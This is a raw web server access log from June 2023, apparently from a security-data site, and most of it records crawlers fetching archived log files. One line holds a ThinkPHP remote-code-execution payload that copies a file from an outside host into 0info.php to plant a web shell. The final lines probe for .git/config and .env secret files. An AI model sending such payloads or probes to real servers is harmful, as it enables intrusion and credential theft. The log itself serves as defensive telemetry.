182.131.31.33 - - [01/Jun/2023:02:38:32 -0700] "GET / HTTP/1.1" 200 13186 "http://www.secrepo.com" "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; InfoPath.3; .NET4.0C; .NET4.0E)" 
216.244.66.245 - - [01/Jun/2023:14:15:57 -0700] "GET /self.logs/error.log.2022-10-07.gz HTTP/1.1" 200 2595 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:16:25 -0700] "GET /self.logs/error.log.2022-11-10.gz HTTP/1.1" 200 6499 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
52.76.53.239 - - [01/Jun/2023:14:16:52 -0700] "GET /self.logs/2016/access.log.2016-03-08.gz HTTP/1.1" 200 8262 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
113.24.58.142 - - [01/Jun/2023:14:17:50 -0700] "GET /e/data/js/ajax.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
113.24.58.142 - - [01/Jun/2023:14:17:51 -0700] "GET /data/admin/allowurl.txt HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:48.0) Gecko/20100101 Firefox/48.0" 
18.136.186.110 - - [01/Jun/2023:14:19:37 -0700] "GET /self.logs/access.log.2021-08-19.gz HTTP/1.1" 200 18099 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
13.215.107.131 - - [01/Jun/2023:14:22:50 -0700] "GET /self.logs/access.log.2019-12-04.gz HTTP/1.1" 200 17808 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
18.142.154.104 - - [01/Jun/2023:14:28:14 -0700] "GET /self.logs/access.log.2018-01-03.gz HTTP/1.1" 200 27861 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
54.251.130.10 - - [01/Jun/2023:14:30:24 -0700] "GET /self.logs/access.log.2019-04-02.gz HTTP/1.1" 200 29470 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
122.248.254.177 - - [01/Jun/2023:14:33:09 -0700] "GET /self.logs/2016/error.log.2016-05-08.gz HTTP/1.1" 200 763 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
219.150.59.58 - - [01/Jun/2023:14:35:07 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:08 -0700] "GET / HTTP/1.1" 200 13185 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:31 -0700] "GET /ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js HTTP/1.1" 301 587 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:32 -0700] "GET /ajax.googleapis.com/ajax/libs/jquery/2.0.2/jquery.min.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:34 -0700] "GET /netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:35 -0700] "GET /netdna.bootstrapcdn.com/bootstrap/3.1.1/js/bootstrap.min.js HTTP/1.1" 301 0 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:40 -0700] "GET /quantserve.com/quant.js HTTP/1.1" 301 521 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
219.150.59.58 - - [01/Jun/2023:14:35:41 -0700] "GET /quantserve.com/quant.js HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.25 Safari/537.36" 
54.151.168.224 - - [01/Jun/2023:14:36:09 -0700] "GET /self.logs/access.log.2022-07-20.gz HTTP/1.1" 200 12462 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:14:38:14 -0700] "GET /robots.txt HTTP/1.1" 200 333 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
18.140.210.211 - - [01/Jun/2023:14:38:36 -0700] "GET /self.logs/2016/error.log.2016-12-09.gz HTTP/1.1" 200 877 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
122.10.45.213 - - [01/Jun/2023:14:39:12 -0700] "GET /?s=index/think%5Capp/invokefunction&function=call_user_func_array&vars%5B0%5D=copy&vars%5B1%5D%5B%5D=http://216.83.53.42/xinma/temp/php_encoded/1684661415/a.txt&vars%5B1%5D%5B%5D=0info.php HTTP/1.1" 418 747 "-" "python-requests/2.31.0" 
3.1.227.55 - - [01/Jun/2023:14:41:14 -0700] "GET /self.logs/access.log.2020-04-05.gz HTTP/1.1" 200 12505 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
13.214.236.128 - - [01/Jun/2023:14:43:59 -0700] "GET /self.logs/access.log.2021-06-11.gz HTTP/1.1" 200 18317 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:14:45:08 -0700] "GET /Datasets%20Description/HTML_Bro_log_1/ftp.html HTTP/1.1" 200 5537 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
52.220.202.33 - - [01/Jun/2023:14:46:40 -0700] "GET /self.logs/access.log.2022-08-21.gz HTTP/1.1" 200 15265 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:14:47:24 -0700] "GET /self.logs/2015/access.log.2015-05-30.gz HTTP/1.1" 200 3126 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:47:31 -0700] "GET /self.logs/2015/error.log.2015-02-08.gz HTTP/1.1" 200 1123 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:47:48 -0700] "GET /self.logs/2015/error.log.2015-03-24.gz HTTP/1.1" 200 1593 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:48:02 -0700] "GET /self.logs/2015/error.log.2015-07-04.gz HTTP/1.1" 200 883 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:48:17 -0700] "GET /self.logs/2015/error.log.2015-07-28.gz HTTP/1.1" 200 708 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:48:29 -0700] "GET /self.logs/2015/error.log.2015-09-21.gz HTTP/1.1" 200 946 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:48:40 -0700] "GET /self.logs/2015/error.log.2015-12-31.gz HTTP/1.1" 200 669 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:48:53 -0700] "GET /self.logs/2016/access.log.2016-01-10.gz HTTP/1.1" 200 7118 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:02 -0700] "GET /self.logs/2016/access.log.2016-05-07.gz HTTP/1.1" 200 8275 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:12 -0700] "GET /self.logs/2016/access.log.2016-08-18.gz HTTP/1.1" 200 5713 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:19 -0700] "GET /self.logs/2016/access.log.2016-08-31.gz HTTP/1.1" 200 8549 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:25 -0700] "GET /self.logs/2016/access.log.2016-09-06.gz HTTP/1.1" 200 8471 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
13.229.173.208 - - [01/Jun/2023:14:49:27 -0700] "GET /self.logs/2016/error.log.2016-04-22.gz HTTP/1.1" 200 813 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:14:49:34 -0700] "GET /self.logs/2016/access.log.2016-11-11.gz HTTP/1.1" 200 7854 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:42 -0700] "GET /self.logs/2016/error.log.2016-01-02.gz HTTP/1.1" 200 915 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:48 -0700] "GET /self.logs/2016/error.log.2016-01-19.gz HTTP/1.1" 200 703 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:49:54 -0700] "GET /self.logs/2016/error.log.2016-01-24.gz HTTP/1.1" 200 724 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:50:00 -0700] "GET /self.logs/2016/error.log.2016-07-22.gz HTTP/1.1" 200 1365 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:50:05 -0700] "GET /self.logs/2016/error.log.2016-08-04.gz HTTP/1.1" 200 2267 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:50:10 -0700] "GET /self.logs/access.log.2017-01-05.gz HTTP/1.1" 200 42666 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:50:36 -0700] "GET /self.logs/access.log.2017-01-26.gz HTTP/1.1" 200 24029 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:51:09 -0700] "GET /self.logs/access.log.2017-03-03.gz HTTP/1.1" 200 18245 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:51:23 -0700] "GET /self.logs/access.log.2017-06-27.gz HTTP/1.1" 200 17918 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:51:54 -0700] "GET /self.logs/access.log.2017-07-09.gz HTTP/1.1" 200 31551 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
18.142.20.83 - - [01/Jun/2023:14:52:19 -0700] "GET /self.logs/access.log.2022-02-13.gz HTTP/1.1" 200 20860 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
118.126.124.32 - - [01/Jun/2023:14:52:19 -0700] "GET / HTTP/1.1" 301 475 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
118.126.124.32 - - [01/Jun/2023:14:52:20 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36" 
216.244.66.245 - - [01/Jun/2023:14:52:22 -0700] "GET /self.logs/access.log.2017-08-10.gz HTTP/1.1" 200 18105 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:52:48 -0700] "GET /self.logs/access.log.2017-11-17.gz HTTP/1.1" 200 19683 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:53:11 -0700] "GET /self.logs/access.log.2017-11-27.gz HTTP/1.1" 200 23495 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:53:51 -0700] "GET /self.logs/access.log.2018-03-29.gz HTTP/1.1" 200 21055 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:54:22 -0700] "GET /self.logs/access.log.2018-04-13.gz HTTP/1.1" 200 26504 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:54:50 -0700] "GET /self.logs/access.log.2018-06-16.gz HTTP/1.1" 200 17435 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
13.214.21.253 - - [01/Jun/2023:14:54:57 -0700] "GET /self.logs/access.log.2020-04-26.gz HTTP/1.1" 200 18837 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:14:56:28 -0700] "GET /self.logs/access.log.2018-08-22.gz HTTP/1.1" 200 24948 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
40.77.167.146 - - [01/Jun/2023:14:57:12 -0700] "GET / HTTP/1.1" 200 13186 "-" "Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm) Chrome/103.0.5060.134 Safari/537.36" 
216.244.66.245 - - [01/Jun/2023:14:57:20 -0700] "GET /self.logs/access.log.2018-10-03.gz HTTP/1.1" 200 29119 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
54.255.76.68 - - [01/Jun/2023:14:57:34 -0700] "GET /self.logs/access.log.2018-01-20.gz HTTP/1.1" 200 18887 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:14:58:11 -0700] "GET /self.logs/access.log.2018-12-21.gz HTTP/1.1" 200 21340 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:58:44 -0700] "GET /self.logs/access.log.2019-01-25.gz HTTP/1.1" 200 45310 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:14:59:31 -0700] "GET /self.logs/access.log.2019-05-03.gz HTTP/1.1" 200 23880 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:00:02 -0700] "GET /self.logs/access.log.2021-08-12.gz HTTP/1.1" 200 18175 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
52.76.252.135 - - [01/Jun/2023:15:00:13 -0700] "GET /self.logs/access.log.2017-12-20.gz HTTP/1.1" 200 24862 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:15:00:52 -0700] "GET /self.logs/access.log.2021-10-15.gz HTTP/1.1" 200 18035 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:02:04 -0700] "GET /self.logs/access.log.2021-11-16.gz HTTP/1.1" 200 16460 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:02:36 -0700] "GET /self.logs/access.log.2021-12-05.gz HTTP/1.1" 200 32045 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
18.140.191.154 - - [01/Jun/2023:15:03:17 -0700] "GET /self.logs/access.log.2020-04-04.gz HTTP/1.1" 200 24713 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:15:03:18 -0700] "GET /self.logs/access.log.2022-07-31.gz HTTP/1.1" 200 13893 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:03:47 -0700] "GET /self.logs/access.log.2019-11-11.gz HTTP/1.1" 200 28971 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:05:29 -0700] "GET /self.logs/error.log.2017-03-24.gz HTTP/1.1" 200 1043 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
3.0.239.211 - - [01/Jun/2023:15:05:42 -0700] "GET /self.logs/2016/access.log.2016-12-20.gz HTTP/1.1" 200 21520 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:15:04:38 -0700] "GET /self.logs/access.log.2019-11-27.gz HTTP/1.1" 200 55480 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:06:00 -0700] "GET /self.logs/error.log.2017-03-25.gz HTTP/1.1" 200 1002 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:06:28 -0700] "GET /self.logs/error.log.2017-04-29.gz HTTP/1.1" 200 1027 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:06:56 -0700] "GET /self.logs/error.log.2017-09-28.gz HTTP/1.1" 200 2244 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:07:22 -0700] "GET /self.logs/error.log.2018-05-06.gz HTTP/1.1" 200 5159 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:07:48 -0700] "GET /self.logs/error.log.2018-05-17.gz HTTP/1.1" 200 5286 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:08:14 -0700] "GET /self.logs/error.log.2018-12-15.gz HTTP/1.1" 200 16192 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
52.76.197.237 - - [01/Jun/2023:15:08:34 -0700] "GET /self.logs/access.log.2022-02-14.gz HTTP/1.1" 200 11624 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:15:08:39 -0700] "GET /self.logs/error.log.2021-01-22 HTTP/1.1" 200 1641 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:09:03 -0700] "GET /self.logs/error.log.2021-08-09.gz HTTP/1.1" 200 1283 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:09:25 -0700] "GET /self.logs/error.log.2021-12-13.gz HTTP/1.1" 200 1038 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:09:46 -0700] "GET /self.logs/error.log.2022-01-21.gz HTTP/1.1" 200 2992 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:10:11 -0700] "GET /self.logs/error.log.2022-05-07.gz HTTP/1.1" 200 2165 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:10:29 -0700] "GET /self.logs/error.log.2022-05-27.gz HTTP/1.1" 200 2834 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:10:47 -0700] "GET /self.logs/error.log.2022-05-29.gz HTTP/1.1" 200 4405 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:11:03 -0700] "GET /self.logs/error.log.2017-01-08.gz HTTP/1.1" 200 1126 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
52.220.39.52 - - [01/Jun/2023:15:11:04 -0700] "GET /self.logs/access.log.2022-06-19.gz HTTP/1.1" 200 11124 "-" "Mozilla/5.0 (Linux; Android 5.0) AppleWebKit/537.36 (KHTML, like Gecko) Mobile Safari/537.36 (compatible; Bytespider; https://zhanzhang.toutiao.com/)" 
216.244.66.245 - - [01/Jun/2023:15:11:21 -0700] "GET /self.logs/error.log.2017-05-12.gz HTTP/1.1" 200 917 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:11:37 -0700] "GET /self.logs/error.log.2020-04-21 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:11:51 -0700] "GET /self.logs/error.log.2020-05-01 HTTP/1.1" 200 307 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:12:05 -0700] "GET /self.logs/error.log.2022-09-04.gz HTTP/1.1" 200 9860 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:12:18 -0700] "GET /self.logs/error.log.2022-10-09.gz HTTP/1.1" 200 883 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:12:31 -0700] "GET /self.logs/error.log.2022-10-11.gz HTTP/1.1" 200 1855 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
216.244.66.245 - - [01/Jun/2023:15:12:42 -0700] "GET /self.logs/error.log.2023-02-01.gz HTTP/1.1" 200 5240 "-" "Mozilla/5.0 (compatible; DotBot/1.2; +https://opensiteexplorer.org/dotbot; help@moz.com)" 
104.128.188.195 - - [01/Jun/2023:15:13:32 -0700] "GET /.git/config HTTP/1.1" 404 328 "-" "python-requests/2.28.1" 
104.128.188.195 - - [01/Jun/2023:15:13:33 -0700] "GET /rest/.env HTTP/1.1" 404 328 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:77.0) Gecko/20100101 Firefox/77.0" 
